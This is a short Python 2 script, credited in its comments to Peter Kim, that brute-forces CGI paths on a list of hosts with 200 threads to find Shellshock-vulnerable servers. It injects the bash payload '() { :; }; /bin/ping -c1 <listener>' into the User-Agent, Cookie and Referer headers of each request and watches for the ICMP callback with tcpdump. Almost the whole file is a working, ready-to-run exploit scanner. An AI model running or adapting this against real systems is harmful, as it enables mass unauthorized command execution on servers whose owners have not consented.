#!/usr/bin/env python
#Uses lists from RAFT and detectify.com
#By Peter Kim
#Description: Fast ShellShock CGI bin brute forcer
#May have to play around with threads to get the best value.
#

from urlparse import urlparse
from threading import Thread
import httplib, sys
from Queue import Queue

concurrent = 200

def doWork():
    while True:
        url = q.get()
        status, url = getStatus(url)
        doSomethingWithResult(status, url)
        q.task_done()

def getStatus(ourl):
    #IP Address Sniffer is Listening on: sudo tcpdump -nni eth0 -e icmp[icmptype] == 8
    IP_listner = "127.0.0.1"

    USER_AGENT = "() { :; }; /bin/ping -c1 " + IP_listner
    Cookie = "() { :; }; /bin/ping -c1 " + IP_listner
    Host = "() { :; }; /bin/ping -c1 " + IP_listner
    Referer = "() { :; }; /bin/ping " + IP_listner
    try:
     url = urlparse(ourl)
     print url
     conn = httplib.HTTPConnection(url.netloc)   
     conn.putrequest("GET", url.path)
     conn.putheader("User-Agent", USER_AGENT)
     conn.putheader("Cookie", Cookie)
     conn.putheader("Referer", Referer)
     conn.endheaders()
     res = conn.getresponse()
     return res.status, ourl
    except:
     return "error", ourl

def doSomethingWithResult(status, url):
    print status, url

q = Queue(concurrent * 2)
for i in range(concurrent):
    t = Thread(target=doWork)
    t.daemon = True
    t.start()
try:
    for url in open('iplist.txt'):
        if "http" not in url:
	 url = "http://" + url.strip()
	else:
	 url = url.strip()
	for file in open('Updated_list_Cgi_files.txt'):
        	q.put(url.strip() + file.strip())
    q.join()
except KeyboardInterrupt:
    sys.exit(1)
